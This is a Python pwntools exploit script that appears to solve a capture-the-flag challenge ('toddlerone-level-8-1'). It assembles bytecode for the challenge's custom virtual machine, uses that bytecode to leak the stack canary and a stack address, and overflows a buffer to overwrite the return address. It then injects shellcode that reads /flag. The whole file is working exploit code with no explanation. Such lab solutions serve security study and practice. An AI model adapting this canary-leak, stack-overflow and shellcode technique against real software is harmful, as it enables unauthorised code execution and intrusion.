from pwn import *
context(os='linux', arch='amd64')
reg={'a':2,'b':16,'c':8,'d':1,'s':4,'i':32,'f':64}
val={'a':0,'b':0,'c':0,'d':0,'s':0,'i':0,'f':0}
func={'mov':8,'add':2,'stk':1,'stm':32,'ldm':16,'cmp':64,'jmp':128,'sys':4,'open':16,'read_code':32,'read_memory':8,'write':16}
def push(a):
    payload=p8(0)+p8(reg[a])+p8(func['stk'])
    return payload
def pop(a):
    payload=p8(reg[a])+p8(0)+p8(func['stk'])
    return payload
def mov(a,b):
    payload=p8(reg[a])+p8(b)+p8(func['mov'])
    return payload
def add(a,b):
    payload=p8(reg[a])+p8(reg[b])+p8(func['add'])
    return payload
def stm(a,b):
    payload=p8(reg[a])+p8(reg[b])+p8(func['stm'])
    return payload
def ldm(a,b):
    payload=p8(reg[a])+p8(reg[b])+p8(func['ldm'])
    return payload
def cmp(a,b):
    payload=p8(reg[a])+p8(reg[b])+p8(func['cmp'])
    return payload
def jmp(a):
    payload=p8(0)+p8(reg[a])+p8(func['jmp'])
    return payload
def sys_open(file_pos):
    payload=mov('a',file_pos)+mov('b',0)+mov('c',0)+p8(func['open'])+p8(reg['d'])+p8(func['sys'])
    return payload
def sys_read_memory(pos):
    if pos>=0xff:
        payload=mov('a',0)+add('a','d')+mov('b',pos-0xff+8)+mov('c',0xff)+p8(func['read_memory'])+p8(reg['d'])+p8(func['sys'])
    else:
        payload=mov('a',0)+add('a','d')+mov('b',pos)+mov('c',0xff)+p8(func['read_memory'])+p8(reg['d'])+p8(func['sys'])
    return payload
def sys_read_memory_from_stdin(pos):
    if pos>0xff:
        payload=mov('a',0)+mov('b',pos-0xff+8)+mov('c',0xff)+p8(func['read_memory'])+p8(reg['d'])+p8(func['sys'])
    else:
        payload=mov('a',0)+mov('b',pos)+mov('c',0xff)+p8(func['read_memory'])+p8(reg['d'])+p8(func['sys'])
    return payload
def sys_write(pos):
    if pos>0xff:
        payload=mov('a',1)+mov('b',pos-0xff+8)+mov('c',0xff)+p8(func['write'])+p8(reg['d'])+p8(func['sys'])
    else:
        payload=mov('a',1)+mov('b',pos)+mov('c',0xff)+p8(func['write'])+p8(reg['d'])+p8(func['sys'])
    return payload
def get(pos,val):
    return mov('a',pos)+mov('b',val)+stm('a','b')
def get_flag():
    payload=get(0,ord('/'))+get(1,ord('f'))+get(2,ord('l'))+get(3,ord('a'))+get(4,ord('g'))+get(5,0)
    payload+=sys_open(0)+sys_read_memory(0)+sys_write(0)
    return payload
for offset in range(520,521):
    p=process("/challenge/toddlerone-level-8-1")
    buflen=280
    p1=sys_read_memory_from_stdin(255)
    p2=sys_write(255)
    p3=sys_read_memory_from_stdin(255)
    p4=sys_write(255)
    p5=sys_read_memory_from_stdin(buflen)
    payload=p1+p2+p3+p4+p5+sys_read_memory_from_stdin(0)
    while len(payload)<765:
        payload+=mov('a',0)
    yancode=b''
    for i in range(len(payload)//3):
        yancode+=p8(payload[i*3+1])+p8(payload[i*3+2])+p8(payload[i*3])
    p.send(yancode)

    payload1=b'a'*6+p8(len(p1)//3)+b'axx'
    p.send(payload1)
    p.recvuntil(b'xx',drop=True)
    canary=u64(b'\x00'+p.recv(7))
    print("[+]Canary:",hex(canary))

    payload2=b'a'*6+p8((len(p1)+len(p2)+len(p3))//3)+b'a'*34
    p.send(payload2)
    p.recvuntil(b'a'*34,drop=True)
    stack_addr=u64(p.recv(6)+b'\x00\x00')
    print("[+]Stack_addr:",hex(stack_addr))

    payload3=b'a'*(0xff-32)+b'a'*5+p8((len(p1)+len(p2)+len(p3)+len(p4)+len(p5))//3)+b'aa'+p64(canary)+b'a'*8+p64(stack_addr-offset)
    p.send(payload3)
    shellcode=asm(shellcraft.cat("/flag"))
    p.send(shellcode)
    print(offset)
    try:
        p.recvuntil("pwn",timeout=3)
    except:
        continue
    print(p.recv())
    break
